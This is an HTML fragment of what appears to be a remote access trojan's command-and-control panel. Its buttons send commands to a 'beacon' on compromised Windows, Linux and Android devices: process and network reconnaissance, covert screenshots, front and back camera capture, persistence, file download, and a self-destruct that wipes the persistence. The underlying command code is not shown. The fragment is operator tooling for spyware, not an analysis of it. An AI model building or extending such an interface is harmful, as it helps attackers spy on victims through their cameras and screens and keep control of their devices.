...
<div class="rt">
    ...
    <div class="pn" id="bp">
        <div class="rw">
            ...
            <div class="cl">
                <div class="cd"><div class="ch">&#9889; Quick Actions <span id="qa-os" style="font-weight:400;font-size:10px;margin-left:8px;padding:2px 6px;border-radius:4px;background:var(--surface2);color:var(--text2)"></span></div>
                <div class="cb">
                    <div class="qb" id="qa-buttons">
                        <!-- Universal -->
                        <button class="btn btn-xs btn-g qa-btn qa-all" onclick="qc('ping')">&#10003; ping</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-all" onclick="qc('hostname')">hostname</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-all" onclick="qc('ps')">ps</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-all" onclick="qc('drives')">drives</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-all" onclick="qc('ifconfig')">ifconfig</button>
                        <!-- Windows only -->
                        <button class="btn btn-xs btn-b qa-btn qa-win" onclick="qc('screenshot')">&#128247; screenshot</button>
                        <button class="btn btn-xs btn-b qa-btn qa-win" onclick="qc('camera')">&#128248; cam</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-win" onclick="qc('persist')">persist</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-win" onclick="qc('download')">&#11015; dl</button>
                        <!-- Linux only -->
                        <button class="btn btn-xs btn-b qa-btn qa-linux" onclick="qc('screenshot')">&#128247; screenshot</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-linux" onclick="qc('persist')">persist</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-linux" onclick="qc('download')">&#11015; dl</button>
                        <!-- Android only -->
                        <button class="btn btn-xs btn-b qa-btn qa-android" onclick="qc('cam back')">&#128248; cam back</button>
                        <button class="btn btn-xs btn-b qa-btn qa-android" onclick="qc('cam front')">&#128248; cam front</button>
                        <button class="btn btn-xs btn-b qa-btn qa-android" onclick="qc('ss')">&#128247; screenshot</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-android" onclick="qc('persist')">persist</button>
                        <!-- Kill / destructive -->
                        <button class="btn btn-xs btn-r qa-btn qa-all" onclick="if(confirm('Kill beacon process?'))qc('die')">&#9760; kill</button>
                        <button class="btn btn-xs btn-r qa-btn qa-all" style="background:#600;border-color:#900" onclick="if(confirm('SELF-DESTRUCT: Remove ALL persistence and kill?'))qc('selfdestruct')">&#128128; self-destruct</button>
                        <button class="btn btn-xs btn-b qa-btn qa-all" onclick="fmToggle()">&#128193; FM</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-all" onclick="dfToggle()">&#128451; DF</button>
                        <button class="btn btn-xs btn-gh qa-btn qa-all" onclick="helpToggle()">&#10067; Help</button>
                    </div>
                </div></div>
            </div>
        </div>
        ...
        <div class="cd" id="help-card" style="display:none">
            <div class="ch">&#10067; Help &amp; Commands <span id="help-os" style="font-weight:400;font-size:10px;margin-left:8px;padding:2px 6px;border-radius:4px;background:var(--surface2);color:var(--text2)"></span><button class="btn btn-xs btn-gh" onclick="helpToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb" id="help-body" style="max-height:400px;overflow-y:auto;font-size:11px;line-height:1.6;color:var(--text)"></div>
        </div>
